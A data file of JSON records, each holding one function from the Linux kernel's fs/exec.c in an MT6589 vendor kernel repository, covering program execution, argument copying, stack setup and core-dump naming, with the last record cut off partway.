{"docstring": "/*\n * sys_execve() executes a new program.\n */\n", "func_signal": "static int do_execve_common(const char *filename,\n\t\t\t\tstruct user_arg_ptr argv,\n\t\t\t\tstruct user_arg_ptr envp,\n\t\t\t\tstruct pt_regs *regs)", "code": "{\n\tstruct linux_binprm *bprm;\n\tstruct file *file;\n\tstruct files_struct *displaced;\n\tbool clear_in_exec;\n\tint retval;\n\tconst struct cred *cred = current_cred();\n#ifdef CONFIG_MT_ENG_BUILD\n    int *argv_p0;\n    int argv0 = 0;\n#endif\n\n\t/*\n\t * We move the actual failure in case of RLIMIT_NPROC excess from\n\t * set*uid() to execve() because too many poorly written programs\n\t * don't check setuid() return code.  Here we additionally recheck\n\t * whether NPROC limit is still exceeded.\n\t */\n\tif ((current->flags & PF_NPROC_EXCEEDED) &&\n\t    atomic_read(&cred->user->processes) > rlimit(RLIMIT_NPROC)) {\n\t\tretval = -EAGAIN;\n\t\tgoto out_ret;\n\t}\n\n\t/* We're below the limit (still or again), so we don't want to make\n\t * further execve() calls fail. */\n\tcurrent->flags &= ~PF_NPROC_EXCEEDED;\n\n\tretval = unshare_files(&displaced);\n\tif (retval)\n\t\tgoto out_ret;\n\n\tretval = -ENOMEM;\n\tbprm = kzalloc(sizeof(*bprm), GFP_KERNEL);\n\tif (!bprm)\n\t\tgoto out_files;\n\n\tretval = prepare_bprm_creds(bprm);\n\tif (retval)\n\t\tgoto out_free;\n\n\tretval = check_unsafe_exec(bprm);\n\tif (retval < 0)\n\t\tgoto out_free;\n\tclear_in_exec = retval;\n\tcurrent->in_execve = 1;\n\n\tfile = open_exec(filename);\n\tretval = PTR_ERR(file);\n\tif (IS_ERR(file))\n\t\tgoto out_unmark;\n\n\tsched_exec();\n\n\tbprm->file = file;\n\tbprm->filename = filename;\n\tbprm->interp = filename;\n\n\tretval = bprm_mm_init(bprm);\n\tif (retval)\n\t\tgoto out_file;\n\n\tbprm->argc = count(argv, MAX_ARG_STRINGS);\n\tif ((retval = bprm->argc) < 0)\n\t\tgoto out;\n\n\tbprm->envc = count(envp, MAX_ARG_STRINGS);\n\tif ((retval = bprm->envc) < 0)\n\t\tgoto out;\n\n\tretval = prepare_binprm(bprm);\n\tif (retval < 0)\n\t\tgoto out;\n\n\tretval = copy_strings_kernel(1, &bprm->filename, bprm);\n\tif (retval < 0)\n\t\tgoto out;\n\n\tbprm->exec = bprm->p;\n\tretval = copy_strings(bprm->envc, envp, bprm);\n\tif (retval < 0)\n\t\tgoto out;\n\n#ifdef CONFIG_MT_ENG_BUILD\n    argv_p0 = (int *)get_user_arg_ptr(argv, 0);\n    if(argv_p0 != 0)\n        argv0 = *argv_p0;\n#endif\n\n\tretval = copy_strings(bprm->argc, argv, bprm);\n\tif (retval < 0)\n\t\tgoto out;\n\n\tretval = search_binary_handler(bprm,regs);\n#ifdef CONFIG_MT_ENG_BUILD\n    if(retval == -999){\n        printk(\"[exec done] argv[0] = 0x%x\\n\", argv0);\n        printk(\"[exec done] argv0_ptr = 0x%x\\n\", (unsigned int)argv_p0);\n    }\n#endif\n\tif (retval < 0)\n\t\tgoto out;\n\n\t/* execve succeeded */\n\tcurrent->fs->in_exec = 0;\n\tcurrent->in_execve = 0;\n\tacct_update_integrals(current);\n\tfree_bprm(bprm);\n\tif (displaced)\n\t\tput_files_struct(displaced);\n\treturn retval;\n\nout:\n\tif (bprm->mm) {\n\t\tacct_arg_size(bprm, 0);\n\t\tmmput(bprm->mm);\n\t}\n\nout_file:\n\tif (bprm->file) {\n\t\tallow_write_access(bprm->file);\n\t\tfput(bprm->file);\n\t}\n\nout_unmark:\n\tif (clear_in_exec)\n\t\tcurrent->fs->in_exec = 0;\n\tcurrent->in_execve = 0;\n\nout_free:\n\tfree_bprm(bprm);\n\nout_files:\n\tif (displaced)\n\t\treset_files_struct(displaced);\nout_ret:\n\treturn retval;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * determine how safe it is to execute the proposed program\n * - the caller must hold ->cred_guard_mutex to protect against\n *   PTRACE_ATTACH\n */\n", "func_signal": "static int check_unsafe_exec(struct linux_binprm *bprm)", "code": "{\n\tstruct task_struct *p = current, *t;\n\tunsigned n_fs;\n\tint res = 0;\n\n\tif (p->ptrace) {\n\t\tif (p->ptrace & PT_PTRACE_CAP)\n\t\t\tbprm->unsafe |= LSM_UNSAFE_PTRACE_CAP;\n\t\telse\n\t\t\tbprm->unsafe |= LSM_UNSAFE_PTRACE;\n\t}\n\n\tn_fs = 1;\n\tspin_lock(&p->fs->lock);\n\trcu_read_lock();\n\tfor (t = next_thread(p); t != p; t = next_thread(t)) {\n\t\tif (t->fs == p->fs)\n\t\t\tn_fs++;\n\t}\n\trcu_read_unlock();\n\n\tif (p->fs->users > n_fs) {\n\t\tbprm->unsafe |= LSM_UNSAFE_SHARE;\n\t} else {\n\t\tres = -EAGAIN;\n\t\tif (!p->fs->in_exec) {\n\t\t\tp->fs->in_exec = 1;\n\t\t\tres = 1;\n\t\t}\n\t}\n\tspin_unlock(&p->fs->lock);\n\n\treturn res;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * umh_pipe_setup\n * helper function to customize the process used\n * to collect the core in userspace.  Specifically\n * it sets up a pipe and installs it as fd 0 (stdin)\n * for the process.  Returns 0 on success, or\n * PTR_ERR on failure.\n * Note that it also sets the core limit to 1.  This\n * is a special value that we use to trap recursive\n * core dumps\n */\n", "func_signal": "static int umh_pipe_setup(struct subprocess_info *info, struct cred *new)", "code": "{\n\tstruct file *rp, *wp;\n\tstruct fdtable *fdt;\n\tstruct coredump_params *cp = (struct coredump_params *)info->data;\n\tstruct files_struct *cf = current->files;\n\n\twp = create_write_pipe(0);\n\tif (IS_ERR(wp))\n\t\treturn PTR_ERR(wp);\n\n\trp = create_read_pipe(wp, 0);\n\tif (IS_ERR(rp)) {\n\t\tfree_write_pipe(wp);\n\t\treturn PTR_ERR(rp);\n\t}\n\n\tcp->file = wp;\n\n\tsys_close(0);\n\tfd_install(0, rp);\n\tspin_lock(&cf->file_lock);\n\tfdt = files_fdtable(cf);\n\t__set_open_fd(0, fdt);\n\t__clear_close_on_exec(0, fdt);\n\tspin_unlock(&cf->file_lock);\n\n\t/* and disallow core files too */\n\tcurrent->signal->rlim[RLIMIT_CORE] = (struct rlimit){1, 1};\n\n\treturn 0;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * The nascent bprm->mm is not visible until exec_mmap() but it can\n * use a lot of memory, account these pages in current->mm temporary\n * for oom_badness()->get_mm_rss(). Once exec succeeds or fails, we\n * change the counter back via acct_arg_size(0).\n */\n", "func_signal": "static void acct_arg_size(struct linux_binprm *bprm, unsigned long pages)", "code": "{\n\tstruct mm_struct *mm = current->mm;\n\tlong diff = (long)(pages - bprm->vma_pages);\n\n\tif (!mm || !diff)\n\t\treturn;\n\n\tbprm->vma_pages = pages;\n\tadd_mm_counter(mm, MM_ANONPAGES, diff);\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * Note that a shared library must be both readable and executable due to\n * security reasons.\n *\n * Also note that we take the address to load from from the file itself.\n */\n", "func_signal": "SYSCALL_DEFINE1(uselib, const char __user *, library)", "code": "{\n\tstruct file *file;\n\tchar *tmp = getname(library);\n\tint error = PTR_ERR(tmp);\n\tstatic const struct open_flags uselib_flags = {\n\t\t.open_flag = O_LARGEFILE | O_RDONLY | __FMODE_EXEC,\n\t\t.acc_mode = MAY_READ | MAY_EXEC | MAY_OPEN,\n\t\t.intent = LOOKUP_OPEN\n\t};\n\n\tif (IS_ERR(tmp))\n\t\tgoto out;\n\n\tfile = do_filp_open(AT_FDCWD, tmp, &uselib_flags, LOOKUP_FOLLOW);\n\tputname(tmp);\n\terror = PTR_ERR(file);\n\tif (IS_ERR(file))\n\t\tgoto out;\n\n\terror = -EINVAL;\n\tif (!S_ISREG(file->f_path.dentry->d_inode->i_mode))\n\t\tgoto exit;\n\n\terror = -EACCES;\n\tif (file->f_path.mnt->mnt_flags & MNT_NOEXEC)\n\t\tgoto exit;\n\n\tfsnotify_open(file);\n\n\terror = -ENOEXEC;\n\tif(file->f_op) {\n\t\tstruct linux_binfmt * fmt;\n\n\t\tread_lock(&binfmt_lock);\n\t\tlist_for_each_entry(fmt, &formats, lh) {\n\t\t\tif (!fmt->load_shlib)\n\t\t\t\tcontinue;\n\t\t\tif (!try_module_get(fmt->module))\n\t\t\t\tcontinue;\n\t\t\tread_unlock(&binfmt_lock);\n\t\t\terror = fmt->load_shlib(file);\n\t\t\tread_lock(&binfmt_lock);\n\t\t\tput_binfmt(fmt);\n\t\t\tif (error != -ENOEXEC)\n\t\t\t\tbreak;\n\t\t}\n\t\tread_unlock(&binfmt_lock);\n\t}\nexit:\n\tfput(file);\nout:\n  \treturn error;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * count() counts the number of strings in array ARGV.\n */\n", "func_signal": "static int count(struct user_arg_ptr argv, int max)", "code": "{\n\tint i = 0;\n\n\tif (argv.ptr.native != NULL) {\n\t\tfor (;;) {\n\t\t\tconst char __user *p = get_user_arg_ptr(argv, i);\n\n\t\t\tif (!p)\n\t\t\t\tbreak;\n\n\t\t\tif (IS_ERR(p))\n\t\t\t\treturn -EFAULT;\n\n\t\t\tif (i++ >= max)\n\t\t\t\treturn -E2BIG;\n\n\t\t\tif (fatal_signal_pending(current))\n\t\t\t\treturn -ERESTARTNOHAND;\n\t\t\tcond_resched();\n\t\t}\n\t}\n\treturn i;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * Prepare credentials and lock ->cred_guard_mutex.\n * install_exec_creds() commits the new creds and drops the lock.\n * Or, if exec fails before, free_bprm() should release ->cred and\n * and unlock.\n */\n", "func_signal": "int prepare_bprm_creds(struct linux_binprm *bprm)", "code": "{\n\tif (mutex_lock_interruptible(&current->signal->cred_guard_mutex))\n\t\treturn -ERESTARTNOINTR;\n\n\tbprm->cred = prepare_exec_creds();\n\tif (likely(bprm->cred))\n\t\treturn 0;\n\n\tmutex_unlock(&current->signal->cred_guard_mutex);\n\treturn -ENOMEM;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * cycle the list of binary formats handler, until one recognizes the image\n */\n", "func_signal": "int search_binary_handler(struct linux_binprm *bprm,struct pt_regs *regs)", "code": "{\n\tunsigned int depth = bprm->recursion_depth;\n\tint try,retval;\n\tstruct linux_binfmt *fmt;\n\tpid_t old_pid, old_vpid;\n\n\tretval = security_bprm_check(bprm);\n\tif (retval)\n\t\treturn retval;\n\n\tretval = audit_bprm(bprm);\n\tif (retval)\n\t\treturn retval;\n\n\t/* Need to fetch pid before load_binary changes it */\n\told_pid = current->pid;\n\trcu_read_lock();\n\told_vpid = task_pid_nr_ns(current, task_active_pid_ns(current->parent));\n\trcu_read_unlock();\n\n\tretval = -ENOENT;\n\tfor (try=0; try<2; try++) {\n\t\tread_lock(&binfmt_lock);\n\t\tlist_for_each_entry(fmt, &formats, lh) {\n\t\t\tint (*fn)(struct linux_binprm *, struct pt_regs *) = fmt->load_binary;\n\t\t\tif (!fn)\n\t\t\t\tcontinue;\n\t\t\tif (!try_module_get(fmt->module))\n\t\t\t\tcontinue;\n\t\t\tread_unlock(&binfmt_lock);\n\t\t\tretval = fn(bprm, regs);\n            /* exec mt_debug*/\n            if(-999 == retval){\n                printk(\"[exec warn] return:%d\\n\", retval);\n                put_binfmt(fmt);\n                return retval;\n            }\n\t\t\t/*\n\t\t\t * Restore the depth counter to its starting value\n\t\t\t * in this call, so we don't have to rely on every\n\t\t\t * load_binary function to restore it on return.\n\t\t\t */\n\t\t\tbprm->recursion_depth = depth;\n\t\t\tif (retval >= 0) {\n\t\t\t\tif (depth == 0) {\n\t\t\t\t\ttrace_sched_process_exec(current, old_pid, bprm);\n\t\t\t\t\tptrace_event(PTRACE_EVENT_EXEC, old_vpid);\n\t\t\t\t}\n\t\t\t\tput_binfmt(fmt);\n\t\t\t\tallow_write_access(bprm->file);\n\t\t\t\tif (bprm->file)\n\t\t\t\t\tfput(bprm->file);\n\t\t\t\tbprm->file = NULL;\n\t\t\t\tcurrent->did_exec = 1;\n\t\t\t\tproc_exec_connector(current);\n\t\t\t\treturn retval;\n\t\t\t}\n\t\t\tread_lock(&binfmt_lock);\n\t\t\tput_binfmt(fmt);\n\t\t\tif (retval != -ENOEXEC || bprm->mm == NULL)\n\t\t\t\tbreak;\n\t\t\tif (!bprm->file) {\n\t\t\t\tread_unlock(&binfmt_lock);\n\t\t\t\treturn retval;\n\t\t\t}\n\t\t}\n\t\tread_unlock(&binfmt_lock);\n#ifdef CONFIG_MODULES\n\t\tif (retval != -ENOEXEC || bprm->mm == NULL) {\n\t\t\tbreak;\n\t\t} else {\n#define printable(c) (((c)=='\\t') || ((c)=='\\n') || (0x20<=(c) && (c)<=0x7e))\n\t\t\tif (printable(bprm->buf[0]) &&\n\t\t\t    printable(bprm->buf[1]) &&\n\t\t\t    printable(bprm->buf[2]) &&\n\t\t\t    printable(bprm->buf[3]))\n\t\t\t\tbreak; /* -ENOEXEC */\n\t\t\tif (try)\n\t\t\t\tbreak; /* -ENOEXEC */\n\t\t\trequest_module(\"binfmt-%04x\", *(unsigned short *)(&bprm->buf[2]));\n\t\t}\n#else\n\t\tbreak;\n#endif\n\t}\n\treturn retval;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * Finalizes the stack vm_area_struct. The flags and permissions are updated,\n * the stack is optionally relocated, and some extra space is added.\n */\n", "func_signal": "int setup_arg_pages(struct linux_binprm *bprm,\n\t\t    unsigned long stack_top,\n\t\t    int executable_stack)", "code": "{\n\tunsigned long ret;\n\tunsigned long stack_shift;\n\tstruct mm_struct *mm = current->mm;\n\tstruct vm_area_struct *vma = bprm->vma;\n\tstruct vm_area_struct *prev = NULL;\n\tunsigned long vm_flags;\n\tunsigned long stack_base;\n\tunsigned long stack_size;\n\tunsigned long stack_expand;\n\tunsigned long rlim_stack;\n\n#ifdef CONFIG_STACK_GROWSUP\n\t/* Limit stack size to 1GB */\n\tstack_base = rlimit_max(RLIMIT_STACK);\n\tif (stack_base > (1 << 30))\n\t\tstack_base = 1 << 30;\n\n\t/* Make sure we didn't let the argument array grow too large. */\n\tif (vma->vm_end - vma->vm_start > stack_base)\n\t\treturn -ENOMEM;\n\n\tstack_base = PAGE_ALIGN(stack_top - stack_base);\n\n\tstack_shift = vma->vm_start - stack_base;\n\tmm->arg_start = bprm->p - stack_shift;\n\tbprm->p = vma->vm_end - stack_shift;\n#else\n\tstack_top = arch_align_stack(stack_top);\n\tstack_top = PAGE_ALIGN(stack_top);\n\n\tif (unlikely(stack_top < mmap_min_addr) ||\n\t    unlikely(vma->vm_end - vma->vm_start >= stack_top - mmap_min_addr))\n\t\treturn -ENOMEM;\n\n\tstack_shift = vma->vm_end - stack_top;\n\n\tbprm->p -= stack_shift;\n\tmm->arg_start = bprm->p;\n#endif\n\n\tif (bprm->loader)\n\t\tbprm->loader -= stack_shift;\n\tbprm->exec -= stack_shift;\n\n\tdown_write(&mm->mmap_sem);\n\tvm_flags = VM_STACK_FLAGS;\n\n\t/*\n\t * Adjust stack execute permissions; explicitly enable for\n\t * EXSTACK_ENABLE_X, disable for EXSTACK_DISABLE_X and leave alone\n\t * (arch default) otherwise.\n\t */\n\tif (unlikely(executable_stack == EXSTACK_ENABLE_X))\n\t\tvm_flags |= VM_EXEC;\n\telse if (executable_stack == EXSTACK_DISABLE_X)\n\t\tvm_flags &= ~VM_EXEC;\n\tvm_flags |= mm->def_flags;\n\tvm_flags |= VM_STACK_INCOMPLETE_SETUP;\n\n\tret = mprotect_fixup(vma, &prev, vma->vm_start, vma->vm_end,\n\t\t\tvm_flags);\n\tif (ret)\n\t\tgoto out_unlock;\n\tBUG_ON(prev != vma);\n\n\t/* Move stack pages down in memory. */\n\tif (stack_shift) {\n\t\tret = shift_arg_pages(vma, stack_shift);\n\t\tif (ret)\n\t\t\tgoto out_unlock;\n\t}\n\n\t/* mprotect_fixup is overkill to remove the temporary stack flags */\n\tvma->vm_flags &= ~VM_STACK_INCOMPLETE_SETUP;\n\n\tstack_expand = 131072UL; /* randomly 32*4k (or 2*64k) pages */\n\tstack_size = vma->vm_end - vma->vm_start;\n\t/*\n\t * Align this down to a page boundary as expand_stack\n\t * will align it up.\n\t */\n\trlim_stack = rlimit(RLIMIT_STACK) & PAGE_MASK;\n#ifdef CONFIG_STACK_GROWSUP\n\tif (stack_size + stack_expand > rlim_stack)\n\t\tstack_base = vma->vm_start + rlim_stack;\n\telse\n\t\tstack_base = vma->vm_end + stack_expand;\n#else\n\tif (stack_size + stack_expand > rlim_stack)\n\t\tstack_base = vma->vm_end - rlim_stack;\n\telse\n\t\tstack_base = vma->vm_start - stack_expand;\n#endif\n\tcurrent->mm->start_stack = bprm->p;\n\tret = expand_stack(vma, stack_base);\n\tif (ret)\n\t\tret = -EFAULT;\n\nout_unlock:\n\tup_write(&mm->mmap_sem);\n\treturn ret;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * set_dumpable converts traditional three-value dumpable to two flags and\n * stores them into mm->flags.  It modifies lower two bits of mm->flags, but\n * these bits are not changed atomically.  So get_dumpable can observe the\n * intermediate state.  To avoid doing unexpected behavior, get get_dumpable\n * return either old dumpable or new one by paying attention to the order of\n * modifying the bits.\n *\n * dumpable |   mm->flags (binary)\n * old  new | initial interim  final\n * ---------+-----------------------\n *  0    1  |   00      01      01\n *  0    2  |   00      10(*)   11\n *  1    0  |   01      00      00\n *  1    2  |   01      11      11\n *  2    0  |   11      10(*)   00\n *  2    1  |   11      11      01\n *\n * (*) get_dumpable regards interim value of 10 as 11.\n */\n", "func_signal": "void set_dumpable(struct mm_struct *mm, int value)", "code": "{\n\tswitch (value) {\n\tcase 0:\n\t\tclear_bit(MMF_DUMPABLE, &mm->flags);\n\t\tsmp_wmb();\n\t\tclear_bit(MMF_DUMP_SECURELY, &mm->flags);\n\t\tbreak;\n\tcase 1:\n\t\tset_bit(MMF_DUMPABLE, &mm->flags);\n\t\tsmp_wmb();\n\t\tclear_bit(MMF_DUMP_SECURELY, &mm->flags);\n\t\tbreak;\n\tcase 2:\n\t\tset_bit(MMF_DUMP_SECURELY, &mm->flags);\n\t\tsmp_wmb();\n\t\tset_bit(MMF_DUMPABLE, &mm->flags);\n\t\tbreak;\n\t}\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * Create a new mm_struct and populate it with a temporary stack\n * vm_area_struct.  We don't have enough context at this point to set the stack\n * flags, permissions, and offset, so we use temporary values.  We'll update\n * them later in setup_arg_pages().\n */\n", "func_signal": "int bprm_mm_init(struct linux_binprm *bprm)", "code": "{\n\tint err;\n\tstruct mm_struct *mm = NULL;\n\n\tbprm->mm = mm = mm_alloc();\n\terr = -ENOMEM;\n\tif (!mm)\n\t\tgoto err;\n\n\terr = init_new_context(current, mm);\n\tif (err)\n\t\tgoto err;\n\n\terr = __bprm_mm_init(bprm);\n\tif (err)\n\t\tgoto err;\n\n\treturn 0;\n\nerr:\n\tif (mm) {\n\t\tbprm->mm = NULL;\n\t\tmmdrop(mm);\n\t}\n\n\treturn err;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/* CONFIG_MMU */\n", "func_signal": "struct file *open_exec(const char *name)", "code": "{\n\tstruct file *file;\n\tint err;\n\tstatic const struct open_flags open_exec_flags = {\n\t\t.open_flag = O_LARGEFILE | O_RDONLY | __FMODE_EXEC,\n\t\t.acc_mode = MAY_EXEC | MAY_OPEN,\n\t\t.intent = LOOKUP_OPEN\n\t};\n\n\tfile = do_filp_open(AT_FDCWD, name, &open_exec_flags, LOOKUP_FOLLOW);\n\tif (IS_ERR(file))\n\t\tgoto out;\n\n\terr = -EACCES;\n\tif (!S_ISREG(file->f_path.dentry->d_inode->i_mode))\n\t\tgoto exit;\n\n\tif (file->f_path.mnt->mnt_flags & MNT_NOEXEC)\n\t\tgoto exit;\n\n\tfsnotify_open(file);\n\n\terr = deny_write_access(file);\n\tif (err)\n\t\tgoto exit;\n\nout:\n\treturn file;\n\nexit:\n\tfput(file);\n\treturn ERR_PTR(err);\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/* format_corename will inspect the pattern parameter, and output a\n * name into corename, which must have space for at least\n * CORENAME_MAX_SIZE bytes plus one byte for the zero terminator.\n */\n", "func_signal": "static int format_corename(struct core_name *cn, long signr)", "code": "{\n\tconst struct cred *cred = current_cred();\n\tconst char *pat_ptr = core_pattern;\n\tint ispipe = (*pat_ptr == '|');\n\tint pid_in_pattern = 0;\n\tint err = 0;\n\n\tcn->size = CORENAME_MAX_SIZE * atomic_read(&call_count);\n\tcn->corename = kmalloc(cn->size, GFP_KERNEL);\n\tcn->used = 0;\n\n\tif (!cn->corename)\n\t\treturn -ENOMEM;\n\n\t/* Repeat as long as we have more pattern to process and more output\n\t   space */\n\twhile (*pat_ptr) {\n\t\tif (*pat_ptr != '%') {\n\t\t\tif (*pat_ptr == 0)\n\t\t\t\tgoto out;\n\t\t\terr = cn_printf(cn, \"%c\", *pat_ptr++);\n\t\t} else {\n\t\t\tswitch (*++pat_ptr) {\n\t\t\t/* single % at the end, drop that */\n\t\t\tcase 0:\n\t\t\t\tgoto out;\n\t\t\t/* Double percent, output one percent */\n\t\t\tcase '%':\n\t\t\t\terr = cn_printf(cn, \"%c\", '%');\n\t\t\t\tbreak;\n\t\t\t/* pid */\n\t\t\tcase 'p':\n\t\t\t\tpid_in_pattern = 1;\n\t\t\t\terr = cn_printf(cn, \"%d\",\n\t\t\t\t\t      task_tgid_vnr(current));\n\t\t\t\tbreak;\n\t\t\t/* uid */\n\t\t\tcase 'u':\n\t\t\t\terr = cn_printf(cn, \"%d\", cred->uid);\n\t\t\t\tbreak;\n\t\t\t/* gid */\n\t\t\tcase 'g':\n\t\t\t\terr = cn_printf(cn, \"%d\", cred->gid);\n\t\t\t\tbreak;\n\t\t\t/* signal that caused the coredump */\n\t\t\tcase 's':\n\t\t\t\terr = cn_printf(cn, \"%ld\", signr);\n\t\t\t\tbreak;\n\t\t\t/* UNIX time of coredump */\n\t\t\tcase 't': {\n\t\t\t\tstruct timeval tv;\n\t\t\t\tdo_gettimeofday(&tv);\n\t\t\t\terr = cn_printf(cn, \"%lu\", tv.tv_sec);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t/* hostname */\n\t\t\tcase 'h': {\n\t\t\t\tchar *namestart = cn->corename + cn->used;\n\t\t\t\tdown_read(&uts_sem);\n\t\t\t\terr = cn_printf(cn, \"%s\",\n\t\t\t\t\t      utsname()->nodename);\n\t\t\t\tup_read(&uts_sem);\n\t\t\t\tcn_escape(namestart);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t/* executable */\n\t\t\tcase 'e': {\n\t\t\t\tchar *commstart = cn->corename + cn->used;\n\t\t\t\terr = cn_printf(cn, \"%s\", current->comm);\n\t\t\t\tcn_escape(commstart);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase 'E':\n\t\t\t\terr = cn_print_exe_file(cn);\n\t\t\t\tbreak;\n\t\t\t/* core limit size */\n\t\t\tcase 'c':\n\t\t\t\terr = cn_printf(cn, \"%lu\",\n\t\t\t\t\t      rlimit(RLIMIT_CORE));\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t++pat_ptr;\n\t\t}\n\n\t\tif (err)\n\t\t\treturn err;\n\t}\n\n\t/* Backward compatibility with core_uses_pid:\n\t *\n\t * If core_pattern does not include a %p (as is the default)\n\t * and core_uses_pid is set, then .%pid will be appended to\n\t * the filename. Do not do this for piped commands. */\n\tif (!ispipe && !pid_in_pattern && core_uses_pid) {\n\t\terr = cn_printf(cn, \".%d\", task_tgid_vnr(current));\n\t\tif (err)\n\t\t\treturn err;\n\t}\nout:\n\treturn ispipe;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * 'copy_strings()' copies argument/environment strings from the old\n * processes's memory to the new process's stack.  The call to get_user_pages()\n * ensures the destination page is created and not swapped out.\n */\n", "func_signal": "static int copy_strings(int argc, struct user_arg_ptr argv,\n\t\t\tstruct linux_binprm *bprm)", "code": "{\n\tstruct page *kmapped_page = NULL;\n\tchar *kaddr = NULL;\n\tunsigned long kpos = 0;\n\tint ret;\n\n\twhile (argc-- > 0) {\n\t\tconst char __user *str;\n\t\tint len;\n\t\tunsigned long pos;\n\n\t\tret = -EFAULT;\n\t\tstr = get_user_arg_ptr(argv, argc);\n\t\tif (IS_ERR(str))\n\t\t\tgoto out;\n\n\t\tlen = strnlen_user(str, MAX_ARG_STRLEN);\n\t\tif (!len)\n\t\t\tgoto out;\n\n\t\tret = -E2BIG;\n\t\tif (!valid_arg_len(bprm, len))\n\t\t\tgoto out;\n\n\t\t/* We're going to work our way backwords. */\n\t\tpos = bprm->p;\n\t\tstr += len;\n\t\tbprm->p -= len;\n\n\t\twhile (len > 0) {\n\t\t\tint offset, bytes_to_copy;\n\n\t\t\tif (fatal_signal_pending(current)) {\n\t\t\t\tret = -ERESTARTNOHAND;\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tcond_resched();\n\n\t\t\toffset = pos % PAGE_SIZE;\n\t\t\tif (offset == 0)\n\t\t\t\toffset = PAGE_SIZE;\n\n\t\t\tbytes_to_copy = offset;\n\t\t\tif (bytes_to_copy > len)\n\t\t\t\tbytes_to_copy = len;\n\n\t\t\toffset -= bytes_to_copy;\n\t\t\tpos -= bytes_to_copy;\n\t\t\tstr -= bytes_to_copy;\n\t\t\tlen -= bytes_to_copy;\n\n\t\t\tif (!kmapped_page || kpos != (pos & PAGE_MASK)) {\n\t\t\t\tstruct page *page;\n\n\t\t\t\tpage = get_arg_page(bprm, pos, 1);\n\t\t\t\tif (!page) {\n\t\t\t\t\tret = -E2BIG;\n\t\t\t\t\tgoto out;\n\t\t\t\t}\n\n\t\t\t\tif (kmapped_page) {\n\t\t\t\t\tflush_kernel_dcache_page(kmapped_page);\n\t\t\t\t\tkunmap(kmapped_page);\n\t\t\t\t\tput_arg_page(kmapped_page);\n\t\t\t\t}\n\t\t\t\tkmapped_page = page;\n\t\t\t\tkaddr = kmap(kmapped_page);\n\t\t\t\tkpos = pos & PAGE_MASK;\n\t\t\t\tflush_arg_page(bprm, kpos, kmapped_page);\n\t\t\t}\n\t\t\tif (copy_from_user(kaddr+offset, str, bytes_to_copy)) {\n\t\t\t\tret = -EFAULT;\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t}\n\t}\n\tret = 0;\nout:\n\tif (kmapped_page) {\n\t\tflush_kernel_dcache_page(kmapped_page);\n\t\tkunmap(kmapped_page);\n\t\tput_arg_page(kmapped_page);\n\t}\n\treturn ret;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * This function makes sure the current process has its own signal table,\n * so that flush_signal_handlers can later reset the handlers without\n * disturbing other processes.  (Other processes might share the signal\n * table via the CLONE_SIGHAND option to clone().)\n */\n", "func_signal": "static int de_thread(struct task_struct *tsk)", "code": "{\n\tstruct signal_struct *sig = tsk->signal;\n\tstruct sighand_struct *oldsighand = tsk->sighand;\n\tspinlock_t *lock = &oldsighand->siglock;\n\n\tif (thread_group_empty(tsk))\n\t\tgoto no_thread_group;\n\n\t/*\n\t * Kill all other threads in the thread group.\n\t */\n\tspin_lock_irq(lock);\n\tif (signal_group_exit(sig)) {\n\t\t/*\n\t\t * Another group action in progress, just\n\t\t * return so that the signal is processed.\n\t\t */\n\t\tspin_unlock_irq(lock);\n\t\treturn -EAGAIN;\n\t}\n\n\tsig->group_exit_task = tsk;\n\tsig->notify_count = zap_other_threads(tsk);\n\tif (!thread_group_leader(tsk))\n\t\tsig->notify_count--;\n\n\twhile (sig->notify_count) {\n\t\t__set_current_state(TASK_UNINTERRUPTIBLE);\n\t\tspin_unlock_irq(lock);\n\t\tschedule();\n\t\tspin_lock_irq(lock);\n\t}\n\tspin_unlock_irq(lock);\n\n\t/*\n\t * At this point all other threads have exited, all we have to\n\t * do is to wait for the thread group leader to become inactive,\n\t * and to assume its PID:\n\t */\n\tif (!thread_group_leader(tsk)) {\n\t\tstruct task_struct *leader = tsk->group_leader;\n\n\t\tsig->notify_count = -1;\t/* for exit_notify() */\n\t\tfor (;;) 